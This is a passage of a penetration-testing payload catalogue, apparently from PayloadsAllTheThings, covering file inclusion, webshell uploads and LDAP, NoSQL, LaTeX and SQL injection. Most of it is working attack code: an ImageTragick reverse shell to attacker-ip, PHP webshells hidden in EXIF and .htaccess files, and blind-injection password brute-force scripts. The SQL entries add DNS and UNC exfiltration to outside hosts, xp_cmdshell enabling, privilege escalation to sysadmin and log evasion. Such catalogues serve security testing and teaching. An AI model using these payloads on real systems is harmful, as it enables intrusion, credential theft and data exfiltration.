[File Inclusion] When used in PHP or a similar application, it may allow an attacker to specify commands to execute i...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

#### wrapper_input
[File Inclusion] Specify your payload in the POST parameters, this can be done with a simple `curl` command.
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

#### wrapper_php_filter
[File Inclusion] The part "`php://filter`" is case insensitive | Filter | Description | | ------ | ----------- | | `p...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

#### wrapper_zip
[File Inclusion] Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php; Zip the file
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
```

### file_upload

#### apache_htaccess
[Upload Insecure Files] The `AddType` directive in an `.htaccess` file is used to specify the MIME (Multipurpose Inte...
**Categories:** file_upload, webshell
```
AddType mime-type extension [extension ...]
```

#### cve_20163714_imagetragik
[Upload Insecure Files] Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1...
**Categories:** file_upload, webshell
```
push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
```

#### cve_2022_44268
[Upload Insecure Files] CVE-2022-44268 is an information disclosure vulnerability identified in ImageMagick. An attac...
**Categories:** file_upload, webshell
```
apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
```

#### cve_ffmpeg_hls
[Upload Insecure Files] FFmpeg is an open source software used for processing audio and video formats. You can use a...
**Categories:** file_upload, webshell
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

#### defaults_extensions
[Upload Insecure Files] Here is a list of the default extensions for web shell pages in the selected languages (PHP,...
**Categories:** file_upload, webshell
```
.php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
```

#### dependency_manager
[Upload Insecure Files] Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a...
**Categories:** file_upload, webshell
```
"scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
```

#### less_known_php_extensions
[Upload Insecure Files] pht phps phar phpt pgif phtml phtm inc ASP Server
**Categories:** file_upload, webshell
```
.asp
    .aspx
    .config
    .cer # (IIS <= 7.5)
    .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
```

#### picture_metadata
[Upload Insecure Files] Create a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can...
**Categories:** file_upload, webshell
```
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

#### polyglot_htaccess
[Upload Insecure Files] If the `exif_imagetype` function is used on the server side to determine the image type, crea...
**Categories:** file_upload, webshell
```
width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
```

#### self_contained_htaccess
[Upload Insecure Files] Self Contained .htaccess
**Categories:** file_upload, webshell
```
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directives from the .htaccess file
AddType application/x-httpd-php .htaccess
```

#### the_apache_directives_from_the_htaccess_file
[Upload Insecure Files] AddType application/x-httpd-php .htaccess
**Categories:** file_upload, webshell
```
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

#### upload_tricks
[Upload Insecure Files] Extensions**: Use double extensions : `.jpg.php, .png.php5 Use reverse double extension (usef...
**Categories:** file_upload, webshell
```
Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
```

#### wsgi_uwsgiini
[Upload Insecure Files] uWSGI configuration files can include “magic” variables, placeholders and operators defined w...
**Categories:** file_upload, webshell
```
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

### latex_injection

#### command_execution
[LaTeX Injection] The output of the command will be redirected to stdout, therefore you need to use a temp file to ge...
**Categories:** latex_injection, remote_code_execution
```
\immediate\write18{id > output}
\input{output}
```

#### read_file
[LaTeX Injection] Attackers can read the content of sensitive files on the server. Read file and interpret the LaTeX...
**Categories:** latex_injection, remote_code_execution
```
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

#### write_file
[LaTeX Injection] Write single lined file:
**Categories:** latex_injection, remote_code_execution
```
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

### ldap_injection

#### authentication_bypass
[LDAP Injection] Attempt to manipulate the filter logic by injecting always-true conditions. Example 1**: This LDAP q...
**Categories:** ldap_injection
```
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

#### blind_exploitation
[LDAP Injection] This scenario demonstrates LDAP blind exploitation using a technique similar to binary search or cha...
**Categories:** ldap_injection
```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

#### defaults_attributes
[LDAP Injection] Can be used in an injection like `*)(ATTRIBUTE_HERE=*
**Categories:** ldap_injection
```
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

#### discover_valid_ldap_fields
[LDAP Injection] Discover Valid LDAP Fields
**Categories:** ldap_injection
```
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

#### exploiting_userpassword_attribute
[LDAP Injection] userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING...
**Categories:** ldap_injection
```
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

#### special_blind_ldap_injection
Special Blind LDAP Injection
**Categories:** ldap_injection
```
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

### nosql_injection

#### extract_data_information
[NoSQL Injection] Extract data with "`$regex`" query operator. HTTP data
**Categories:** nosql_injection
```
username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
```

#### extract_length_information
[NoSQL Injection] Inject a payload using the $regex operator. The injection will work when the length is correct.
**Categories:** nosql_injection
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

#### nosql_injection_get
[NoSQL Injection] Python script:
**Categories:** nosql_injection
```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

#### operator_injection
[NoSQL Injection] | Operator | Description        | | -------- | ------------------ | | $ne      | not equal...
**Categories:** nosql_injection
```
db.products.find({ "price": userInput })
```

#### post_with_json_body
[NoSQL Injection] Python script:
**Categories:** nosql_injection
```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

#### post_with_urlencoded_body
[NoSQL Injection] Python script:
**Categories:** nosql_injection
```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

#### waf_and_filters
[NoSQL Injection] Remove pre-condition**: In MongoDB, if a document contains duplicate keys, only the last occurrence...
**Categories:** nosql_injection
```
{"id":"10", "id":"100"}
```

### sql_injection

#### alternative_to_group_concat
[SQL Injection] Requirement: `MySQL >= 5.7.22 Use `json_arrayagg()` instead of `group_concat()` which allows less sym...
**Categories:** sql_injection
```
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

#### alternative_to_information_schema
[SQL Injection] information_schema.tables` alternative
**Categories:** sql_injection
```
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

#### alternative_to_version
[SQL Injection] Alternative to VERSION
**Categories:** sql_injection
```
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

#### basic_arguments_for_sqlmap
[SQL Injection] Basic Arguments For SQLmap
**Categories:** sql_injection
```
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

#### columns_dump_time_based
[SQL Injection] Columns Dump Time Based
**Categories:** sql_injection
```
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

#### command_udf_library
[SQL Injection] First you need to check if the UDF are installed on the server.
**Categories:** sql_injection
```
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

#### crawl_and_auto_exploit
[SQL Injection] This method is not advisable for penetration testing; it should only be used in controlled environmen...
**Categories:** sql_injection
```
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

#### custom_injection_point
[SQL Injection] A custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt...
**Categories:** sql_injection
```
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

#### custom_sql_payload
[SQL Injection] The `--sql-query` option in SQLmap is used to manually run your own SQL query on a vulnerable databas...
**Categories:** sql_injection
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

#### custom_tamper_scripts
[SQL Injection] When creating a custom tamper script, there are a few things to keep in mind. The script architecture...
**Categories:** sql_injection
```
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

#### database_dump_time_based
[SQL Injection] Database Dump Time Based
**Categories:** sql_injection
```
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

#### default_tamper_scripts
A tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security me...
**Categories:** sql_injection
```
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

#### dns_exfiltration
[SQL Injection] DNS Exfiltration
**Categories:** sql_injection
```
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

#### evaluate_python_code
[SQL Injection] The `--eval` option lets you define or modify request parameters using Python. The evaluated variable...
**Categories:** sql_injection
```
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

#### extract_data_without_columns_name
[SQL Injection] Extracting data from the 4th column without knowing its name.
**Categories:** sql_injection
```
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

#### extract_database_with_information_schema
[SQL Injection] This query retrieves the names of all schemas (databases) on the server.
**Categories:** sql_injection
```
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

#### getting_a_shell
[SQL Injection] SQL Shell:
**Categories:** sql_injection
```
sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
```

#### identify_time_based
[SQL Injection] Identify Time Based
**Categories:** sql_injection
```
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

#### iterative_null_method
[SQL Injection] Systematically increase the number of columns in the `UNION SELECT` statement until the payload execu...
**Categories:** sql_injection
```
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;--
```

#### load_a_request_file
A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL injection testing. This fi...
**Categories:** sql_injection
```
sqlmap -r request.txt
```

#### mssql_blind_based
[SQL Injection] MSSQL Blind Based
**Categories:** sql_injection
```
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

#### mssql_blind_with_substring_equivalent
[SQL Injection] | Function    | Example                                         | | ----------- | -------------------...
**Categories:** sql_injection
```
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

#### mssql_database_credentials
[SQL Injection] **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b197...
**Categories:** sql_injection
```
SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
```

#### mssql_dns_exfiltration
[SQL Injection] Technique from @ptswarm **Permission**: Requires `VIEW SERVER STATE` permission on the server.
**Categories:** sql_injection
```
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
```

#### mssql_error_based
[SQL Injection] | Name         | Payload         | | ------------ | --------------- | | CONVERT      | `AND 1337=CONV...
**Categories:** sql_injection
```
convert(int,@@version)
    cast((SELECT @@version) as int)
```

#### mssql_list_columns
[SQL Injection] MSSQL List Columns
**Categories:** sql_injection
```
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

#### mssql_list_databases
[SQL Injection] MSSQL List Databases
**Categories:** sql_injection
```
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
```

#### mssql_list_permissions
[SQL Injection] Listing effective permissions of current user on the server.
**Categories:** sql_injection
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

#### mssql_list_tables
[SQL Injection] MSSQL List Tables
**Categories:** sql_injection
```
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

#### mssql_make_user_dba
[SQL Injection] MSSQL Make User DBA
**Categories:** sql_injection
```
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

#### mssql_opsec
[SQL Injection] Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password
**Categories:** sql_injection
```
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

#### mssql_read_file
[SQL Injection] Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABAS...
**Categories:** sql_injection
```
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

#### mssql_stacked_query
[SQL Injection] Stacked query without any statement terminator
**Categories:** sql_injection
```
-- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

#### mssql_time_based
In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the datab...
**Categories:** sql_injection
```
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

#### mssql_trusted_links
[SQL Injection] A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server ins...
**Categories:** sql_injection
```
select * from master..sysservers
```

#### mssql_unc_path
[SQL Injection] MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `x...
**Categories:** sql_injection
```
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
```

#### mssql_union_based
[SQL Injection] Extract databases names
**Categories:** sql_injection
```
$ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
```

#### mssql_write_file
[SQL Injection] MSSQL Write File
**Categories:** sql_injection
```
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

#### mysql_blind_using_a_conditional_statement
[SQL Injection] TRUE: `if @@version starts with a 5`:
**Categories:** sql_injection
```
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
```

#### mysql_blind_with_like
In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wild...
**Categories:** sql_injection
```
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

#### mysql_blind_with_make_set
[SQL Injection] MYSQL Blind With MAKE_SET
**Categories:** sql_injection
```
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

#### mysql_blind_with_substring_equivalent
[SQL Injection] | Function | Example | Description | | --- | --- | --- | | `SUBSTR` | `SUBSTR(version(),1,1)=5` | Ext...
**Categories:** sql_injection
```
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

#### mysql_current_queries
[SQL Injection] INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides infor...
**Categories:** sql_injection
```
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

#### mysql_dios_dump_in_one_shot
DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database con...
**Categories:** sql_injection
```
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

#### mysql_error_based_basic
[SQL Injection] Works with `MySQL >= 4.1
**Categories:** sql_injection
```
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

#### mysql_error_based_extractvalue_function
[SQL Injection] Works with `MySQL >= 5.1
**Categories:** sql_injection
```
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

#### mysql_error_based_name_const_function_only_for_constants
[SQL Injection] Works with `MySQL >= 5.0
**Categories:** sql_injection
```
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

#### mysql_error_based_updatexml_function
[SQL Injection] MYSQL Error Based - UpdateXML Function
**Categories:** sql_injection
```
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

#### mysql_insert
[SQL Injection] ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to inse...
**Categories:** sql_injection
```
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

#### mysql_out_of_band
[SQL Injection] MYSQL Out of Band
**Categories:** sql_injection
```
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

#### mysql_read_content_of_a_file
[SQL Injection] Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is runn...
**Categories:** sql_injection
```
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

#### mysql_testing_injection
[SQL Injection] **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';
**Categories:** sql_injection
```
' False
    '' True
    " False
    "" True
    \ False
    \\ True
```

#### mysql_time_based
[SQL Injection] The following SQL codes will delay the output from MySQL. MySQL 4/5 : `BENCHMARK()
**Categories:** sql_injection
```
+BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

#### mysql_truncation
[SQL Injection] In MYSQL "`admin`" and "`admin`" are the same. If the username column in the database has a character...
**Categories:** sql_injection
```
`username` varchar(20) not null
```

#### order_by_method
[SQL Injection] Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY`...
**Categories:** sql_injection
```
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

#### postgresql_blind_with_substring_equivalent
[SQL Injection] | Function    | Example                                         | | ----------- | -------------------...
**Categories:** sql_injection
```
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
